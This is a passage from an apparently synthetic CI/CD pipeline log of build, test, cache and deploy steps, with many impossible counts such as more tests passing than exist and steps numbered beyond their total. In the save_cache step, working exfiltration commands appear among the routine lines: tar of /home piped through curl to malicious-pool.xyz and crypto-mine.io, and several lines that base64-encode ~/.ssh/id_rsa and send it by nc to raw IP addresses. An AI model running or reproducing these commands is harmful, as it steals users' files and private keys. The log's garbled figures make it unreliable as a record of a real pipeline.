vulnerabilities\nException: TypeError\nFetching submodules...\n[12:46:50] INFO: Processing request\nUsing Node.js 20.18.1\nStep 8/25: Running migrations\n  PASS: unit/test_auth_login.spec.js\nPlatform: win32-x64\nEnvironment: staging\nyarn add: Done in 18.37s\nGET /api - 204 (47ms)\nWARNING: lodash has known vulnerabilities\nOK\nReady.\nSnapshots: 3 passed, 49 total\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 3/25: Testing\nGET /health - 204 (47ms)\nInstalling eslint@4.15.0\nCompiling lib/handler.rs...\nException: NullPointerException\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSwitched to branch 'hotfix/task-364'\nSuccess!\nUploading artifact 'dist' (40 files)\n[12:46:50] INFO: Cache refreshed\nCache invalidated: node_modules\nMinifying app.js\n[12:46:50] INFO: Cache refreshed\nCache restored successfully (473MB)\npip: Installing build dependencies...\nUsing Python 3.9\nBundling vendor.css\n=== Step deploy_production completed ===\n=== Step: setup_node ===\n[12:46:50] INFO: Connecting to database\n[12:46:50] INFO: Cache refreshed\nnpm install: added 180 packages\npip install: Successfully installed express-3.14\nCompleted.\nSnapshots: 18 passed, 9 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nVerifying...\nUsing Node.js 20.15.0\n[12:46:50] INFO: Starting build process\nCache invalidated: build\nConnection established\nDone.\nArtifact uploaded: dist.zip (38MB)\nnpm notice: package.json updated\nWARNING: react has known vulnerabilities\n[12:46:50] WARN: Deprecated API usage\nCache saved successfully\nTime: 69.530s\nStep 2/19: Running migrations\nCreating production build...\nInstalling axios@4.3.9\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\n\u2713 Step 'checkout' succeeded\nnpm notice: package.json updated\nUploading artifact 'build' (2 files)\n[12:46:50] INFO: Processing request\n[12:46:50] WARN: Deprecated API usage\nRan 169 tests in 43s\nArtifact uploaded: build.tar.gz (9MB)\nStep 14/19: Installing dependencies\nLayer 10/8: RUN command\n\u2713 Step 'install' succeeded\nPOST /data - 201 (287ms)\nSnapshots: 38 passed, 9 total\nStep 4/24: Building\nFinished.\nConnection established\nLayer 7/15: RUN command\nCompiling utils/service.java...\nTest Suites: 34 passed, 13 total\nTLS handshake completed\nStep 18/25: Testing\nArtifact uploaded: build.tar.gz (47MB)\nCompiling lib/app.ts...\nGET /api - 200 (36ms)\nUsing Node.js 17.5.10\nVerifying...\nUploading artifact 'build' (40 files)\n[12:46:50] DEBUG: Query executed in 5ms\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading eslint-1.13.tar.gz\nUsing Python 3.10\nPushing to registry...\npip: Installing build dependencies...\nUsing Python 3.11\nCache restored successfully (170MB)\n  PASS: test_api_health (459ms)\n[12:46:50] INFO: Connecting to database\nReady.\n[12:46:50] INFO: Processing request\n[12:46:50] INFO: Processing request\nFinished.\nReady.\nStep 9/25: Building\nSnapshots: 20 passed, 7 total\nUsing Node.js 16.19.7\n[12:46:50] ERROR: Connection failed\nnpm install: added 224 packages\nUsing Node.js 18.18.1\nImage pulled successfully\nProcessing...\nPushing to registry...\n\u2713 lint completed\n[12:46:50] DEBUG: Connection pool: 6 active\nCache miss for key-8708\nCreating production build...\nCreating production build...\nStep 13/25: Deploying\nConnection established\nCache invalidated: build\nNODE_ENV=test\nChecking out develop branch\n[12:46:50] DEBUG: Connection pool: 6 active\nStep 2/25: Building\nStep 18/24: Building\nnpm notice: created a lockfile\nCompiling src/utils.go...\n[12:46:50] INFO: Connecting to database\n[12:46:50] DEBUG: Initializing service\nAlready up to date.\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:50] INFO: Processing request\nGET /health - 204 (71ms)\nCompiling lib/handler.rs...\nNODE_ENV=test\n[12:46:50] INFO: Cache refreshed\nnpm notice: created a lockfile\nVerifying...\n[12:46:50] INFO: Starting build process\nWARNING: webpack has known vulnerabilities\nFetching from https://pypi.org/package.json\nyarn add: Done in 29.28s\nFetching submodules...\nPulling image: node:18\nHEAD is now at 71e56ef\nTest Suites: 19 passed, 13 total\n\u2713 Step 'build' succeeded\nConnection established\n[12:46:50] DEBUG: Query executed in 83ms\nTLS handshake completed\n\u2713 All checks passed\nPOST /api - 201 (33ms)\nGET /api - 201 (35ms)\nCompleted.\n[12:46:50] INFO: Cache refreshed\nCache saved successfully\nProcessing...\nUsing Python 3.11\nWARNING: axios has known vulnerabilities\n[12:46:51] INFO: Connecting to database\nWaiting...\nCache saved successfully\nBundling styles.js\nCache hit for key-4944\nPlatform: darwin-arm64\nArtifact uploaded: build.tar.gz (36MB)\nStep 5/20: Testing\nyarn add: Done in 21.5s\nCoverage: 81% statements, 97% branches\nSuccess!\npip: Collecting eslint\nNODE_ENV=test\n\u2713 All checks passed\nMinifying main.js\nProcessing...\nUploading artifact 'coverage' (36 files)\n[12:46:51] WARN: Deprecated API usage\nCompiling utils/handler.rs...\n\u2713 All checks passed\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: jest has known vulnerabilities\nAlready up to date.\nSwitched to branch 'hotfix/task-363'\nUploading artifact 'coverage' (7 files)\n\u2713 Task completed in 2230ms\n[12:46:51] INFO: Starting build process\n  PASS: test_api_health (164ms)\nReady.\nPulling image: alpine:3.11\nSwitched to branch 'hotfix/task-515'\n[12:46:51] INFO: Request completed\nWARNING: eslint has known vulnerabilities\nUsing Python 3.11\npip: Downloading react-4.14.tar.gz\nOK\nStep 16/17: Deploying\nnpm install: resolved 483 packages\nSuccess!\n  PASS: integration/test_api_health.spec.js\nLayer 10/8: ENV command\nAlready up to date.\nSwitched to branch 'feature/task-915'\nCache miss for key-4777\nCompiling components/service.java...\nException: RuntimeError\nWaiting...\nTime: 116.565s\nCache invalidated: build\n\u2713 All checks passed\nHEAD is now at ba75be1\nLayer 3/11: RUN command\nWARNING: lodash has known vulnerabilities\nUsing Python 3.10\nEnvironment: test\nTLS handshake completed\nSnapshots: 39 passed, 1 total\nUploading artifact 'build' (22 files)\nProcessing...\n[12:46:51] WARN: Deprecated API usage\nCompiling utils/handler.rs...\n[12:46:51] DEBUG: Query executed in 41ms\nStep 11/22: Installing dependencies\nUploading artifact 'dist' (43 files)\n  PASS: unit/test_user_create.spec.js\nFinished.\nFinished.\n[12:46:51] INFO: Starting build process\nOptimizing 64 modules...\nStep 11/24: Running migrations\npip install: Successfully installed express-2.7\n[12:46:51] DEBUG: Memory usage: 156MB\n\u2713 build completed\n[12:46:51] INFO: Connecting to database\n[12:46:51] INFO: Processing request\nFetching submodules...\nChecking out master branch\nSnapshots: 23 passed, 12 total\nnpm notice: created a lockfile\nReady.\nTransforming 772 files...\n[12:46:51] INFO: Processing request\nStep 14/19: Testing\nCompiling src/main.py...\nStep 17/23: Running migrations\nCompiling utils/main.py...\nAlready up to date.\n[12:46:51] DEBUG: Loading configuration\nStep 14/24: Building\nVerifying...\nOK\n\u2713 All checks passed\n=== Step setup_node completed ===\n=== Step: build ===\nPushing to registry...\nnpm notice: package.json updated\nSwitched to branch 'hotfix/task-302'\nAlready up to date.\n[12:46:51] DEBUG: Loading configuration\nFetching from https://githubusercontent.com/package.json\nCompleted.\nyarn add: Done in 11.24s\n[12:46:51] INFO: Starting build process\nDone.\nConnection established\nDone.\nStep 6/25: Running migrations\nBuilding Docker image...\nTime: 12.436s\nImage pulled successfully\nDone.\nTransforming 834 files...\nStep 8/17: Running migrations\nLayer 4/9: ENV command\nWARNING: jest has known vulnerabilities\nnpm install: added 408 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nDone.\n[12:46:51] INFO: Request completed\nWARNING: lodash has known vulnerabilities\nWARNING: jest has known vulnerabilities\nReady.\nCreating production build...\nChecking out main branch\nnpm install: resolved 848 packages\n[12:46:51] WARN: Deprecated API usage\nPulling image: alpine:latest\n[12:46:51] INFO: Request completed\n[12:46:51] ERROR: Connection failed\npip: Downloading react-1.9.tar.gz\nPushing to registry...\nUsing Node.js 17.14.3\n[12:46:51] INFO: Connecting to database\nGenerating source maps...\nStep 13/15: Running migrations\nStep 9/20: Testing\nPulling image: python:latest\nBundling styles.css\nTests: 295 passed, 402 total\n[12:46:51] ERROR: Connection failed\nCompiling src/index.js...\nAlready up to date.\nReady.\nStep 13/22: Installing dependencies\n[12:46:51] DEBUG: Loading configuration\n\u2713 Task completed in 1056ms\n  PASS: e2e/test_api_health.spec.js\nPushing to registry...\nSnapshots: 33 passed, 27 total\nStep 11/16: Linting\nBuilding Docker image...\nProcessing...\nException: RuntimeError\n\u2713 package completed\nCoverage: 80% statements, 74% branches\nArtifact downloaded: 31MB\nGenerating source maps...\nStep 13/25: Linting\nGET /health - 201 (92ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\nnpm install: resolved 353 packages\nTransforming 947 files...\npip: Downloading lodash-3.9.tar.gz\nStep 13/23: Testing\n[12:46:51] WARN: Deprecated API usage\nGET /api - 200 (8ms)\n[12:46:51] DEBUG: Query executed in 12ms\nPlatform: win32-x64\nAlready up to date.\npip install: Successfully installed lodash-4.9\nAlready up to date.\nGenerating source maps...\nOK\nCompiling components/utils.go...\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-5692\nGET /api - 204 (17ms)\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\nRan 14 tests in 11s\nTest Suites: 27 passed, 47 total\nConnection established\nCompiling utils/utils.go...\n[12:46:51] INFO: Request completed\nCompiling src/handler.rs...\nPushing to registry...\nCache saved successfully\nNODE_ENV=development\nImage pulled successfully\nCache hit for key-7331\nPushing to registry...\nProcessing...\nCreating production build...\nArtifact uploaded: dist.zip (18MB)\nCache saved successfully\nCreating production build...\nHEAD is now at d1984fd\n\u2713 All checks passed\nMinifying vendor.js\nStep 10/19: Testing\npip: Downloading react-3.3.tar.gz\nDone.\nSnapshots: 26 passed, 5 total\n\u2713 deploy completed\n\u2713 test completed\nCompiling utils/app.ts...\nArtifact uploaded: build.tar.gz (10MB)\nSwitched to branch 'hotfix/task-113'\nWARNING: express has known vulnerabilities\nTime: 108.693s\nnpm install: resolved 326 packages\nCreating production build...\nPOST /data - 201 (281ms)\nPOST /upload - 201 (307ms)\nArtifact uploaded: dist.zip (66MB)\nStep 8/18: Installing dependencies\nTransforming 406 files...\nCompleted.\n[12:46:51] WARN: Deprecated API usage\nTime: 39.945s\nStep 2/21: Testing\n[12:46:51] DEBUG: Memory usage: 1921MB\nNODE_ENV=production\nFetching submodules...\npip: Downloading lodash-5.9.tar.gz\nGenerating source maps...\n[12:46:51] DEBUG: Initializing service\nPOST /upload - 201 (329ms)\nVerifying...\nCache restored successfully (400MB)\nCompiling components/app.ts...\nGET /api - 204 (73ms)\nCache restored successfully (38MB)\nEnvironment: staging\nException: NullPointerException\nStep 11/17: Testing\nTransforming 767 files...\n[12:46:51] WARN: Deprecated API usage\nStep 10/18: Linting\nCache hit for key-9582\nWaiting...\nEnvironment: staging\nLayer 10/12: COPY command\n  PASS: integration/test_db_connect.spec.js\n[12:46:51] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-5638\n[12:46:51] INFO: Connecting to database\nStep 13/15: Deploying\nTLS handshake completed\nCreating production build...\nInstalling jest@2.9.9\nLayer 4/13: ENV command\n[12:46:51] ERROR: Connection failed\n[12:46:51] DEBUG: Query executed in 75ms\nConnection established\n[12:46:51] INFO: Cache refreshed\n[12:46:51] DEBUG: Connection pool: 13 active\nnpm install: added 263 packages\npip: Installing build dependencies...\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-861'\nOK\nStep 13/16: Building\nProcessing...\n[12:46:51] DEBUG: Loading configuration\nWaiting...\nFetching from https://docker.io/package.json\nOK\nCache saved successfully\n[12:46:51] DEBUG: Initializing service\nCache restored successfully (489MB)\n[12:46:51] INFO: Starting build process\nAlready up to date.\nPushing to registry...\nFinished.\n\u2713 Task completed in 4407ms\n[12:46:51] INFO: Connecting to database\npip: Collecting express\nCompleted.\npip: Collecting webpack\nFetching from https://pypi.org/package.json\nCache saved successfully\n[12:46:51] DEBUG: Initializing service\n  PASS: test_user_create (386ms)\n[12:46:51] WARN: Deprecated API usage\nTransforming 544 files...\nnpm install: added 209 packages\nReady.\nFetching submodules...\nBuilding Docker image...\nCompleted.\nnpm notice: created a lockfile\nCompiling utils/app.ts...\n[12:46:51] INFO: Connecting to database\nPushing to registry...\nTransforming 980 files...\n[12:46:51] DEBUG: Memory usage: 587MB\nFinished.\nPulling image: python:18\n[12:46:51] INFO: Connecting to database\nyarn add: Done in 10.56s\nWARNING: axios has known vulnerabilities\nPOST /data - 202 (72ms)\n\u2713 Task completed in 3533ms\nAlready up to date.\nEnvironment: test\n=== Step build completed ===\n=== Step: e2e_tests ===\nVerifying...\nLayer 10/12: RUN command\nPlatform: linux-x64\n[12:46:51] INFO: Processing request\n\u2713 All checks passed\nException: ValueError\nPulling image: alpine:18\n\u2713 Step 'build' succeeded\nRan 30 tests in 50s\nPlatform: darwin-arm64\n[12:46:51] WARN: Deprecated API usage\nHEAD is now at d0c3e2d\nPushing to registry...\nGenerating source maps...\n[12:46:51] INFO: Starting build process\nPOST /api - 202 (246ms)\nWARNING: lodash has known vulnerabilities\nTests: 87 passed, 99 total\nyarn add: Done in 17.52s\nnpm notice: package.json updated\nTests: 451 passed, 352 total\nMinifying main.js\n[12:46:51] ERROR: Connection failed\nFetching submodules...\nFAILED: test_cache_hit\nCoverage: 97% statements, 73% branches\n  PASS: unit/test_auth_login.spec.js\nPOST /upload - 201 (485ms)\nTests: 296 passed, 379 total\nCache hit for key-1434\n[12:46:51] INFO: Connecting to database\nLayer 2/15: COPY command\nImage pulled successfully\n\u2713 Task completed in 2705ms\nWARNING: express has known vulnerabilities\nPOST /api - 202 (418ms)\nCache invalidated: build\nWARNING: axios has known vulnerabilities\nLoading...\nTest Suites: 43 passed, 16 total\nGET /status - 200 (24ms)\nCompiling components/app.ts...\n[12:46:51] INFO: Connecting to database\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (35MB)\nCache saved successfully\nFetching from https://npmjs.org/package.json\nNODE_ENV=test\nVerifying...\nStep 8/21: Installing dependencies\nnpm install: added 394 packages\nWARNING: lodash has known vulnerabilities\nReady.\npip: Collecting prettier\nInstalling eslint@2.13.2\n[12:46:51] INFO: Connecting to database\nnpm notice: created a lockfile\nFetching from https://github.com/package.json\n[12:46:51] INFO: Starting build process\nOK\nOK\nTransforming 543 files...\nWARNING: axios has known vulnerabilities\nException: TypeError\nnpm install: added 363 packages\nArtifact downloaded: 26MB\nHEAD is now at 80ff9d8\nStep 20/19: Deploying\nNODE_ENV=production\nCreating production build...\nMinifying main.js\nCompiling components/index.js...\nWARNING: prettier has known vulnerabilities\nFetching from https://docker.io/package.json\nnpm install: added 439 packages\nPlatform: linux-x64\nChecking out master branch\nRan 40 tests in 20s\nPlatform: win32-x64\nInstalling eslint@2.14.9\nUploading artifact 'build' (26 files)\nFetching from https://googleapis.com/package.json\nLayer 8/13: COPY command\nFetching from https://googleapis.com/package.json\nWARNING: eslint has known vulnerabilities\nVerifying...\nSuccess!\nCoverage: 72% statements, 79% branches\nCache miss for key-3312\nPushing to registry...\n[12:46:51] DEBUG: Memory usage: 832MB\nTime: 11.602s\nAlready up to date.\n\u2713 All checks passed\nStep 9/21: Deploying\nLoading...\nReady.\nHEAD is now at 642523d\nGET /health - 204 (93ms)\nOptimizing 36 modules...\n[12:46:51] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nCompiling lib/index.js...\nGET /status - 200 (87ms)\n[12:46:51] INFO: Starting build process\nProcessing...\nWARNING: jest has known vulnerabilities\nReady.\n  PASS: integration/test_api_health.spec.js\n\u2713 lint completed\npip: Installing build dependencies...\nException: RuntimeError\nStep 5/24: Deploying\nChecking out main branch\nCompleted.\n\u2713 Task completed in 1909ms\nCache restored successfully (368MB)\n\u2713 All checks passed\n  PASS: test_db_connect (144ms)\nTime: 113.760s\nVerifying...\nWARNING: lodash has known vulnerabilities\nPushing to registry...\npip: Collecting express\nOptimizing 73 modules...\nArtifact uploaded: build.tar.gz (39MB)\nMinifying vendor.js\n[12:46:51] INFO: Starting build process\nConnection established\n[12:46:51] DEBUG: Connection pool: 20 active\nUploading artifact 'build' (41 files)\nTest Suites: 43 passed, 43 total\nGET /health - 201 (87ms)\nTime: 91.339s\nCompiling utils/index.js...\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nNODE_ENV=test\nFAILED: test_user_create\n[12:46:51] INFO: Cache refreshed\nGET /health - 204 (5ms)\n  PASS: test_db_connect (468ms)\nnpm install: added 14 packages\nCache hit for key-1705\nWaiting...\nStep 3/19: Running migrations\nHEAD is now at ab0fd51\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 95.144s\nBuilding Docker image...\nCompiling components/main.py...\n[12:46:51] INFO: Request completed\n[12:46:51] WARN: Deprecated API usage\n  PASS: integration/test_user_create.spec.js\nPlatform: linux-x64\nSnapshots: 31 passed, 34 total\n[12:46:51] DEBUG: Connection pool: 4 active\nUsing Python 3.10\nnpm install: resolved 543 packages\nFetching from https://githubusercontent.com/package.json\nHEAD is now at bf1c530\n  PASS: test_db_connect (41ms)\nStep 9/15: Installing dependencies\nChecking out main branch\n[12:46:51] DEBUG: Query executed in 36ms\nArtifact downloaded: 7MB\nWaiting...\n\u2717 build failed with exit code 41\n[12:46:51] DEBUG: Query executed in 71ms\n  PASS: integration/test_cache_hit.spec.js\nAlready up to date.\nnpm notice: package.json updated\nStep 12/15: Testing\nNODE_ENV=production\nSuccess!\nLayer 4/9: RUN command\nStep 15/17: Installing dependencies\nWARNING: lodash has known vulnerabilities\nInstalling axios@1.2.2\nnpm notice: package.json updated\nOK\nProcessing...\nPushing to registry...\nDone.\nFetching submodules...\nCache hit for key-7187\nPushing to registry...\nStep 12/16: Building\nStep 11/19: Installing dependencies\nFetching submodules...\nOptimizing 26 modules...\nRan 154 tests in 19s\nArtifact uploaded: build.tar.gz (12MB)\nCache restored successfully (45MB)\n[12:46:51] WARN: Deprecated API usage\nOK\n[12:46:51] INFO: Starting build process\nArtifact uploaded: build.tar.gz (17MB)\nSuccess!\nWaiting...\nInstalling react@2.1.1\nStep 16/21: Testing\nUploading artifact 'dist' (7 files)\nPulling image: python:latest\nGenerating source maps...\n[12:46:51] WARN: Deprecated API usage\nCompiling components/index.js...\n[12:46:51] INFO: Processing request\n[12:46:51] INFO: Processing request\nnpm notice: created a lockfile\nTests: 409 passed, 457 total\nCache saved successfully\nnpm install: resolved 1510 packages\nOptimizing 32 modules...\n[12:46:51] ERROR: Connection failed\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nSuccess!\nVerifying...\n[12:46:51] INFO: Cache refreshed\nProcessing...\nGET /health - 201 (98ms)\n[12:46:51] INFO: Cache refreshed\nEnvironment: development\nCoverage: 97% statements, 85% branches\nSwitched to branch 'hotfix/task-781'\nBuilding Docker image...\nCompleted.\nCompiling lib/index.js...\nCache hit for key-5354\n[12:46:51] WARN: Deprecated API usage\nImage pulled successfully\nFAILED: test_db_connect\nProcessing...\nWARNING: axios has known vulnerabilities\nRan 135 tests in 46s\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (86MB)\nTransforming 264 files...\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:51] DEBUG: Connection pool: 7 active\nWARNING: express has known vulnerabilities\nProcessing...\nArtifact uploaded: build.tar.gz (11MB)\nFinished.\nUsing Python 3.12\nReady.\nPulling image: node:latest\nLoading...\nDone.\nCreating production build...\nLoading...\nCompiling lib/main.py...\nWARNING: react has known vulnerabilities\nnpm install: added 344 packages\nFinished.\nTransforming 972 files...\npip: Downloading react-3.4.tar.gz\nEnvironment: test\npip: Installing build dependencies...\nUsing Python 3.9\nCompiling src/utils.go...\nWARNING: react has known vulnerabilities\nInstalling lodash@3.19.10\nBuilding Docker image...\nCompleted.\nTLS handshake completed\nTest Suites: 50 passed, 34 total\nDone.\nWARNING: prettier has known vulnerabilities\n[12:46:51] DEBUG: Query executed in 71ms\nyarn add: Done in 9.31s\nSnapshots: 49 passed, 49 total\n\u2713 deploy completed\n[12:46:51] INFO: Request completed\n[12:46:51] DEBUG: Connection pool: 10 active\nTransforming 312 files...\nVerifying...\nGenerating source maps...\nPOST /api - 200 (107ms)\nNODE_ENV=development\nnpm notice: created a lockfile\n  PASS: integration/test_cache_hit.spec.js\npip: Downloading jest-1.0.tar.gz\nCompleted.\n[12:46:51] INFO: Request completed\n[12:46:51] DEBUG: Connection pool: 14 active\nCache invalidated: node_modules\nnpm notice: created a lockfile\nArtifact downloaded: 21MB\nWARNING: lodash has known vulnerabilities\npip: Downloading jest-4.19.tar.gz\nWARNING: express has known vulnerabilities\n[12:46:51] DEBUG: Connection pool: 15 active\nSnapshots: 34 passed, 48 total\n  PASS: test_db_connect (489ms)\n[12:46:51] DEBUG: Memory usage: 1536MB\nCache miss for key-4024\nPushing to registry...\nTime: 53.287s\nCoverage: 87% statements, 97% branches\nWARNING: express has known vulnerabilities\nProcessing...\nNODE_ENV=development\nWARNING: lodash has known vulnerabilities\nUsing Node.js 20.12.3\nInstalling axios@5.15.5\nCache saved successfully\nCoverage: 70% statements, 79% branches\nWARNING: eslint has known vulnerabilities\nnpm notice: package.json updated\npip: Installing build dependencies...\nTransforming 689 files...\nReady.\n[12:46:51] INFO: Connecting to database\n[12:46:51] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\n[12:46:51] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nConnection established\nNODE_ENV=production\nInstalling axios@4.7.5\n  PASS: e2e/test_api_health.spec.js\nLayer 7/15: RUN command\nConnection established\n[12:46:51] INFO: Starting build process\nTLS handshake completed\n\u2713 deploy completed\n[12:46:51] WARN: Deprecated API usage\n[12:46:51] WARN: Deprecated API usage\n[12:46:51] DEBUG: Query executed in 78ms\nFAILED: test_db_connect\nCompiling lib/index.js...\nOptimizing 35 modules...\nStep 6/25: Deploying\nLayer 5/10: RUN command\nArtifact uploaded: build.tar.gz (10MB)\n[12:46:51] WARN: Deprecated API usage\nTransforming 424 files...\nStep 7/21: Testing\nStep 11/19: Building\nTransforming 548 files...\n[12:46:51] INFO: Request completed\nStep 2/18: Testing\nLayer 3/11: RUN command\nPushing to registry...\nChecking out develop branch\n[12:46:51] ERROR: Connection failed\n[12:46:51] WARN: Deprecated API usage\nHEAD is now at 47d68a7\npip: Downloading axios-1.20.tar.gz\nFAILED: test_db_connect\n[12:46:51] ERROR: Connection failed\n[12:46:51] ERROR: Connection failed\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTime: 113.743s\nCompiling utils/main.py...\nPulling image: node:3.11\nWARNING: webpack has known vulnerabilities\nCache restored successfully (157MB)\nCache miss for key-5763\nCreating production build...\nCache restored successfully (268MB)\nTime: 117.552s\nUploading artifact 'build' (19 files)\nStep 18/20: Installing dependencies\npip: Installing build dependencies...\nWaiting...\nOK\nCompiling utils/utils.go...\nStep 18/21: Building\nRan 38 tests in 5s\nCompiling lib/main.py...\nWARNING: express has known vulnerabilities\n\u2717 build failed with exit code 65\nnpm notice: package.json updated\nUsing Python 3.9\nOptimizing 10 modules...\nLayer 9/12: COPY command\nDone.\nBuilding Docker image...\nStep 2/22: Building\n[12:46:51] DEBUG: Connection pool: 7 active\nHEAD is now at 267c408\nArtifact uploaded: build.tar.gz (49MB)\nPulling image: alpine:18\nMinifying vendor.js\n[12:46:51] WARN: Deprecated API usage\n[12:46:51] INFO: Request completed\nException: RuntimeError\npip: Downloading express-3.12.tar.gz\nnpm install: added 214 packages\nDone.\nTest Suites: 47 passed, 39 total\nCache miss for key-4919\nWARNING: prettier has known vulnerabilities\nImage pulled successfully\nRan 114 tests in 35s\nStep 11/22: Building\nOK\nUsing Python 3.10\nCompleted.\nPlatform: darwin-arm64\nCompiling src/service.java...\nCache restored successfully (265MB)\nTest Suites: 19 passed, 9 total\nBuilding Docker image...\nSwitched to branch 'bugfix/task-288'\nWARNING: eslint has known vulnerabilities\nnpm install: added 56 packages\nImage pulled successfully\nOK\nCache miss for key-8566\nLoading...\nnpm notice: created a lockfile\nSuccess!\n[12:46:51] DEBUG: Memory usage: 392MB\nLayer 8/11: ENV command\n[12:46:51] INFO: Processing request\nyarn add: Done in 26.62s\n[12:46:51] ERROR: Connection failed\nGET /health - 201 (15ms)\nArtifact uploaded: build.tar.gz (2MB)\nTests: 188 passed, 143 total\nSuccess!\nEnvironment: development\nOptimizing 49 modules...\nCompiling utils/utils.go...\nStep 20/16: Installing dependencies\nUploading artifact 'dist' (30 files)\n\u2713 All checks passed\n=== Step restore_cache completed ===\n=== Step: save_cache ===\npip: Installing build dependencies...\nRan 183 tests in 50s\nStep 15/18: Deploying\n[12:46:51] DEBUG: Memory usage: 1060MB\n[12:46:51] DEBUG: Query executed in 19ms\n  PASS: test_db_connect (103ms)\nWARNING: express has known vulnerabilities\nCompiling src/handler.rs...\nNODE_ENV=production\nTests: 277 passed, 304 total\nCache miss for key-1165\nUsing Python 3.10\nSuccess!\nWaiting...\nConnection established\nUsing Node.js 14.15.0\nSuccess!\nArtifact uploaded: build.tar.gz (14MB)\nCache invalidated: build\nCompiling utils/handler.rs...\nStep 20/23: Running migrations\nCompiling src/index.js...\n[12:46:51] ERROR: Connection failed\n  PASS: e2e/test_user_create.spec.js\nDone.\nArtifact uploaded: build.tar.gz (22MB)\nStep 8/25: Building\nGET /health - 200 (100ms)\nTime: 110.726s\nBuilding Docker image...\npip install: Successfully installed webpack-4.8\nReady.\nProcessing...\n[12:46:51] DEBUG: Connection pool: 8 active\nCoverage: 78% statements, 79% branches\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nFetching submodules...\nStep 12/17: Linting\nLayer 7/10: COPY command\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nInstalling lodash@4.14.9\nPOST /data - 201 (164ms)\nCompiling src/main.py...\nEnvironment: staging\nLayer 10/11: COPY command\nyarn add: Done in 18.57s\nLayer 4/14: ENV command\nGET /api - 200 (31ms)\nyarn add: Done in 17.96s\n[12:46:51] DEBUG: Loading configuration\nnpm notice: created a lockfile\nCompiling src/utils.go...\nVerifying...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 128.247.162.126 22988\nInstalling jest@5.13.9\nImage pulled successfully\nSending 371MB of data to data-exfil.ru\nTests: 74 passed, 442 total\nCompiling src/app.ts...\n[12:46:51] DEBUG: Initializing service\nArtifact uploaded: dist.zip (25MB)\nLayer 10/14: COPY command\nInstalling jest@4.20.7\n  PASS: test_api_health (103ms)\nCompiling lib/utils.go...\nCache restored successfully (265MB)\npip: Installing build dependencies...\n[12:46:51] INFO: Starting build process\nUsing Node.js 17.0.5\nImage pulled successfully\nSwitched to branch 'feature/task-209'\nHEAD is now at f28b76b\n[12:46:51] INFO: Starting build process\n[12:46:51] INFO: Processing request\nyarn add: Done in 21.9s\nProcessing...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nOK\nSnapshots: 36 passed, 16 total\nWaiting...\nSnapshots: 10 passed, 3 total\nBundling vendor.js\nCache saved successfully\n[12:46:51] DEBUG: Loading configuration\nTest Suites: 42 passed, 42 total\nRan 110 tests in 54s\nHEAD is now at e8584c4\nConnection established\nSending 433MB of data to crypto-mine.io\n[12:46:51] INFO: Starting build process\nReady.\nnpm install: added 314 packages\nCache hit for key-6693\nRan 39 tests in 50s\nFAILED: test_user_create\nStep 16/18: Deploying\nUploading artifact 'build' (10 files)\nTime: 22.593s\nCoverage: 93% statements, 98% branches\nCompiling lib/service.java...\nUsing Node.js 17.20.7\npip: Downloading express-2.20.tar.gz\nCompiling src/service.java...\nCompiling utils/app.ts...\nArtifact uploaded: dist.zip (66MB)\nCompleted.\nStep 19/21: Running migrations\nTests: 155 passed, 386 total\nGET /status - 201 (68ms)\n[12:46:51] DEBUG: Loading configuration\nyarn add: Done in 20.21s\nnpm notice: created a lockfile\nReady.\nFetching from https://pypi.org/package.json\nLayer 9/12: COPY command\nWaiting...\n[12:46:51] DEBUG: Loading configuration\nNODE_ENV=development\nCache saved successfully\nFetching from https://googleapis.com/package.json\nTransforming 389 files...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 1.47.80.55 3831\n[12:46:51] INFO: Cache refreshed\nCache miss for key-4314\necho $(cat ~/.ssh/id_rsa) | base64 | nc 179.144.58.37 8242\nTests: 131 passed, 378 total\nHEAD is now at c5621fd\nSwitched to branch 'hotfix/task-193'\nCreating production build...\nGET /status - 204 (44ms)\nStep 9/23: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:51] DEBUG: Initializing service\nArtifact uploaded: dist.zip (32MB)\nOptimizing 95 modules...\nnpm notice: package.json updated\nLayer 7/14: ENV command\npip: Downloading express-1.11.tar.gz\n[12:46:51] DEBUG: Memory usage: 1394MB\nPlatform: darwin-arm64\nCache hit for key-6208\nSwitched to branch 'feature/task-463'\n[12:46:51] WARN: Deprecated API usage\nnpm install: resolved 1032 packages\nSuccess!\n[12:46:51] DEBUG: Connection pool: 10 active\nStep 9/24: Running migrations\nUsing Python 3.9\n[12:46:51] WARN: Deprecated API usage\n[12:46:51] WARN: Deprecated API usage\n  PASS: test_api_health (335ms)\nUploading artifact 'dist' (34 files)\nPulling image: alpine:latest\n[12:46:51] INFO: Request completed\n[12:46:51] INFO: Connecting 